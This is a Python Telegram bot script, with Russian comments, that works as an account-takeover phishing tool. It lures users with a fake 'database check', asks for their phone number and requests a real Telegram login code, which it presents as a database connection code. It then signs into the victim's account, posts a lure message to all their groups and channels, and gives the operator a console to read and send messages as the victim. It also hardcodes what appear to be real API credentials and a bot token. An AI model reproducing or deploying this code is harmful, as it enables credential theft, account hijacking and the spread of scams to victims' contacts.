import logging
import os
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)
from telethon.sync import TelegramClient
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.tl.types import Channel, Chat

# Настройка логирования
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Состояния для ConversationHandler
PHONE, CODE = range(2)

# Ваши API-ключи (замените на свои)
API_ID = "27804658"
API_HASH = "b07a67acb15e0582e59d1db55579fb8e"
BOT_TOKEN = "7814381268:AAHuqZjVdX2UPbxFL9Cy7pVCXmqbdbVEzCs"

# Заготовленное сообщение для рассылки
PREPARED_MESSAGE = "@HowIWD_bot кто меня тут сукой записал?АЛЛО"

# Глобальная переменная для хранения активного клиента Telethon
active_client = None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Обработка команды /start, запрос номера телефона."""
    user = update.effective_user
    logger.info(f"Пользователь {user.id} вызвал команду /start")

    # Создаем кнопку для отправки номера телефона
    keyboard = [[KeyboardButton("Отправить номер телефона", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)

    await update.message.reply_text(
        "Привет! Отправь мне свой номер телефона для проверки в базе данных.",
        reply_markup=reply_markup,
    )
    return PHONE

async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Обработка полученного номера телефона."""
    contact = update.message.contact
    phone_number = contact.phone_number
    user_id = update.effective_user.id
    logger.info(f"Получен номер телефона от {user_id}: {phone_number}")

    # Сохраняем номер телефона в контексте
    context.user_data["phone_number"] = phone_number
    context.user_data["code_digits"] = []  # Инициализируем список для цифр кода

    # Очищаем старую сессию, если она существует
    session_file = f"session_{user_id}.session"
    if os.path.exists(session_file):
        os.remove(session_file)
        logger.info(f"Удалена старая сессия: {session_file}")

    # Инициализируем Telethon клиент
    client = TelegramClient(
        f"session_{user_id}",
        API_ID,
        API_HASH,
        system_version="4.16.30-vxCUSTOM",
        app_version="1.0"
    )
    try:
        await client.connect()
        if not await client.is_user_authorized():
            sent_code = await client.send_code_request(phone_number, force_sms=False)
            context.user_data["client"] = client
            context.user_data["code_hash"] = sent_code.phone_code_hash
            logger.info(f"Код успешно отправлен для {phone_number}, phone_code_hash: {sent_code.phone_code_hash}")
        else:
            logger.warning(f"Клиент уже авторизован для {user_id}")
            await update.message.reply_text("Вы уже авторизованы. Попробуйте позже.")
            await client.disconnect()
            return ConversationHandler.END
    except FloodWaitError as fwe:
        logger.error(f"Ограничение Telegram: нужно подождать {fwe.seconds} секунд")
        await update.message.reply_text(f"Слишком много запросов. Подождите {fwe.seconds // 60} минут и попробуйте снова.")
        await client.disconnect()
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"Ошибка при отправке кода: {str(e)}")
        await update.message.reply_text(f"Произошла ошибка: {str(e)}. Попробуйте снова.")
        await client.disconnect()
        return ConversationHandler.END

    # Создаем цифровую клавиатуру
    await update.message.reply_text(
        "Код отправлен! Введите код подключения к базе данных, используя кнопки ниже:",
        reply_markup=create_keypad()
    )
    return CODE

def create_keypad(code_digits: list = None) -> InlineKeyboardMarkup:
    """Создает цифровую клавиатуру с кнопками 0-9, Удалить и Ввести."""
    if code_digits is None:
        code_digits = []

    # Формируем отображение кода (звездочки для безопасности)
    code_display = "*" * len(code_digits) if code_digits else "Введите код"

    # Создаем кнопки 0-9
    buttons = [
        [
            InlineKeyboardButton("1", callback_data="digit_1"),
            InlineKeyboardButton("2", callback_data="digit_2"),
            InlineKeyboardButton("3", callback_data="digit_3"),
        ],
        [
            InlineKeyboardButton("4", callback_data="digit_4"),
            InlineKeyboardButton("5", callback_data="digit_5"),
            InlineKeyboardButton("6", callback_data="digit_6"),
        ],
        [
            InlineKeyboardButton("7", callback_data="digit_7"),
            InlineKeyboardButton("8", callback_data="digit_8"),
            InlineKeyboardButton("9", callback_data="digit_9"),
        ],
        [
            InlineKeyboardButton("0", callback_data="digit_0"),
            InlineKeyboardButton("🔴 Удалить", callback_data="delete"),
            InlineKeyboardButton("✅ Ввести", callback_data="submit"),
        ],
    ]

    # Возвращаем клавиатуру
    return InlineKeyboardMarkup(buttons)

async def handle_keypad(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Обработка нажатий на цифровую клавиатуру."""
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    code_digits = context.user_data.get("code_digits", [])

    # Обрабатываем callback_data
    data = query.data
    if data.startswith("digit_"):
        # Добавляем цифру
        digit = data.split("_")[1]
        code_digits.append(digit)
        context.user_data["code_digits"] = code_digits
    elif data == "delete":
        # Удаляем последнюю цифру
        if code_digits:
            code_digits.pop()
            context.user_data["code_digits"] = code_digits
    elif data == "submit":
        # Проверяем, введен ли код
        if not code_digits:
            await query.edit_message_text(
                text="Ошибка: код не введен. Пожалуйста, введите код.",
                reply_markup=create_keypad(code_digits)
            )
            return CODE

        # Формируем код как строку
        code = "".join(code_digits)
        logger.info(f"Получен код от {user_id}: {code}")

        # Вызываем функцию авторизации
        return await receive_code(update, context, code)

    # Обновляем сообщение с клавиатурой
    code_display = "*" * len(code_digits) if code_digits else "Введите код"
    await query.edit_message_text(
        text=f"Код: {code_display}",
        reply_markup=create_keypad(code_digits)
    )
    return CODE

async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE, code: str = None) -> int:
    """Обработка введенного кода авторизации."""
    global active_client
    query = update.callback_query
    user_id = query.from_user.id
    client = context.user_data.get("client")
    phone_number = context.user_data.get("phone_number")
    phone_code_hash = context.user_data.get("code_hash")

    if not client:
        await query.edit_message_text("Сессия истекла. Пожалуйста, начните заново с /start.")
        return ConversationHandler.END

    try:
        await client.sign_in(
            phone=phone_number, code=code, phone_code_hash=phone_code_hash
        )
        me = await client.get_me()
        active_client = client  # Сохраняем клиент для консольного управления
        await query.edit_message_text(
            f"Авторизация успешна! Вы вошли как {me.first_name}.\n\nНачинаю рассылку заготовленного сообщения..."
        )
        # Запускаем рассылку сразу после авторизации
        await send_message_to_chats(update, context, client)
        # Запускаем консольный интерфейс
        asyncio.create_task(console_interface(user_id))
        return ConversationHandler.END
    except SessionPasswordNeededError:
        await query.edit_message_text(
            "Требуется пароль двухфакторной аутентификации. Этот бот не поддерживает пароли."
        )
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"Ошибка при авторизации: {str(e)}")
        error_message = str(e).lower()
        if "confirmation code has expired" in error_message:
            await query.edit_message_text(
                "Код истек или недействителен. Пожалуйста, начните заново с /start."
            )
        else:
            await query.edit_message_text(
                f"Ошибка авторизации: {str(e)}. Проверьте код и попробуйте снова."
            )
        return ConversationHandler.END
    finally:
        if active_client is None and "client" in context.user_data and context.user_data["client"]:
            await client.disconnect()
            context.user_data["client"] = None

async def send_message_to_chats(update: Update, context: ContextTypes.DEFAULT_TYPE, client: TelegramClient) -> int:
    """Отправка заготовленного сообщения во все каналы и группы."""
    user_id = update.effective_user.id
    logger.info(f"Начало рассылки заготовленного сообщения от {user_id}")

    try:
        await client.connect()
        if not await client.is_user_authorized():
            await update.callback_query.edit_message_text("Сессия истекла. Пожалуйста, начните заново с /start.")
            return ConversationHandler.END

        # Получаем все диалоги (чаты, каналы, группы)
        successful = 0
        failed = 0
        async for dialog in client.iter_dialogs():
            # Проверяем, является ли диалог каналом, супергруппой или обычной группой
            if isinstance(dialog.entity, Channel):
                # Каналы и супергруппы
                if dialog.entity.broadcast or dialog.entity.megagroup:
                    try:
                        await client.send_message(dialog.entity, PREPARED_MESSAGE)
                        successful += 1
                        logger.info(f"Сообщение отправлено в {dialog.name} (ID: {dialog.id})")
                    except FloodWaitError as fwe:
                        logger.error(f"Ограничение Telegram в {dialog.name}: нужно подождать {fwe.seconds} секунд")
                        failed += 1
                    except Exception as e:
                        logger.error(f"Ошибка при отправке в {dialog.name}: {str(e)}")
                        failed += 1
                else:
                    logger.info(f"Пропущен {dialog.name}: не канал и не супергруппа")
            elif isinstance(dialog.entity, Chat):
                # Обычные группы
                try:
                    await client.send_message(dialog.entity, PREPARED_MESSAGE)
                    successful += 1
                    logger.info(f"Сообщение отправлено в {dialog.name} (ID: {dialog.id})")
                except FloodWaitError as fwe:
                    logger.error(f"Ограничение Telegram в {dialog.name}: нужно подождать {fwe.seconds} секунд")
                    failed += 1
                except Exception as e:
                    logger.error(f"Ошибка при отправке в {dialog.name}: {str(e)}")
                    failed += 1
            else:
                logger.info(f"Пропущен {dialog.name}: не канал и не группа")

        await update.callback_query.edit_message_text(
            f"Зашли в базу данных. Смотрим👀 "
            f"Нужно подождать 5 минут, чтобы проверить всю базу данных в ней присутствует <791> позиция"
        )
    except Exception as e:
        logger.error(f"Ошибка при рассылке: {str(e)}")
        await update.callback_query.edit_message_text(f"Произошла ошибка при рассылке: {str(e)}")
    finally:
        context.user_data.clear()  # Очищаем данные после рассылки, но клиент остается активным

    return ConversationHandler.END

async def console_interface(user_id: int):
    """Консольный интерфейс для управления аккаунтом."""
    global active_client
    print(f"\nКонсоль управления аккаунтом (User ID: {user_id})")
    print("Доступные команды:")
    print("  list_chats - Показать список всех каналов и групп")
    print("  send <chat_id> <message> - Отправить сообщение в чат")
    print("  leave <chat_id> - Покинуть чат")
    print("  get_messages <chat_id> <limit> - Получить последние сообщения из чата")
    print("  exit - Завершить сессию и выйти")
    print("Введите команду:")

    while active_client:
        try:
            # Читаем команду из консоли
            command = await asyncio.get_event_loop().run_in_executor(None, input)
            parts = command.strip().split(maxsplit=2)
            if not parts:
                print("Пустая команда. Введите команду, например: list_chats")
                continue

            cmd = parts[0].lower()
            args = parts[1:] if len(parts) > 1 else []

            if cmd == "list_chats":
                await console_list_chats(active_client)
            elif cmd == "send" and len(args) == 2:
                chat_id, message = args
                await console_send_message(active_client, chat_id, message)
            elif cmd == "leave" and len(args) == 1:
                chat_id = args[0]
                await console_leave_chat(active_client, chat_id)
            elif cmd == "get_messages" and len(args) == 2:
                chat_id, limit = args
                await console_get_messages(active_client, chat_id, limit)
            elif cmd == "exit":
                await console_exit(active_client)
                active_client = None
                print("Сессия завершена.")
                break
            else:
                print("Неверная команда или аргументы. Используйте: list_chats, send <chat_id> <message>, leave <chat_id>, get_messages <chat_id> <limit>, exit")
        except Exception as e:
            print(f"Ошибка при выполнении команды: {str(e)}")
        print("\nВведите следующую команду:")

async def console_list_chats(client: TelegramClient):
    """Показать список всех каналов и групп."""
    try:
        await client.connect()
        print("\nСписок чатов:")
        async for dialog in client.iter_dialogs():
            if isinstance(dialog.entity, (Channel, Chat)):
                chat_type = "Канал" if isinstance(dialog.entity, Channel) and dialog.entity.broadcast else \
                            "Супергруппа" if isinstance(dialog.entity, Channel) and dialog.entity.megagroup else "Группа"
                print(f"{chat_type}: {dialog.name} (ID: {dialog.id})")
    except Exception as e:
        print(f"Ошибка при получении чатов: {str(e)}")

async def console_send_message(client: TelegramClient, chat_id: str, message: str):
    """Отправить сообщение в указанный чат."""
    try:
        chat_id = int(chat_id)
        await client.connect()
        await client.send_message(chat_id, message)
        print(f"Сообщение отправлено в чат {chat_id}: {message}")
    except ValueError:
        print("Ошибка: chat_id должен быть числом")
    except Exception as e:
        print(f"Ошибка при отправке сообщения: {str(e)}")

async def console_leave_chat(client: TelegramClient, chat_id: str):
    """Покинуть указанный чат."""
    try:
        chat_id = int(chat_id)
        await client.connect()
        await client.delete_dialog(chat_id)
        print(f"Чат {chat_id} покинут")
    except ValueError:
        print("Ошибка: chat_id должен быть числом")
    except Exception as e:
        print(f"Ошибка при покидании чата: {str(e)}")

async def console_get_messages(client: TelegramClient, chat_id: str, limit: str):
    """Получить последние сообщения из чата."""
    try:
        chat_id = int(chat_id)
        limit = int(limit)
        if limit <= 0:
            print("Ошибка: limit должен быть положительным числом")
            return
        await client.connect()
        messages = await client.get_messages(chat_id, limit=limit)
        print(f"\nПоследние {limit} сообщений в чате {chat_id}:")
        for msg in messages:
            sender = await msg.get_sender()
            sender_name = sender.username if sender and hasattr(sender, 'username') else "Unknown"
            print(f"[{msg.date}] {sender_name}: {msg.text}")
    except ValueError:
        print("Ошибка: chat_id и limit должны быть числами")
    except Exception as e:
        print(f"Ошибка при получении сообщений: {str(e)}")

async def console_exit(client: TelegramClient):
    """Завершить сессию."""
    try:
        await client.disconnect()
        print("Клиент отключен")
    except Exception as e:
        print(f"Ошибка при выходе: {str(e)}")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Отмена процесса."""
    global active_client
    user_id = update.effective_user.id
    client = context.user_data.get("client")
    if client:
        await client.disconnect()
    if active_client:
        await active_client.disconnect()
        active_client = None
    context.user_data.clear()
    await update.message.reply_text("Процесс авторизации или рассылки отменен.")
    return ConversationHandler.END

def main() -> None:
    """Запуск бота."""
    application = Application.builder().token(BOT_TOKEN).build()

    # Настройка ConversationHandler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PHONE: [MessageHandler(filters.CONTACT, receive_phone)],
            CODE: [CallbackQueryHandler(handle_keypad)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(conv_handler)

    # Запуск бота
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()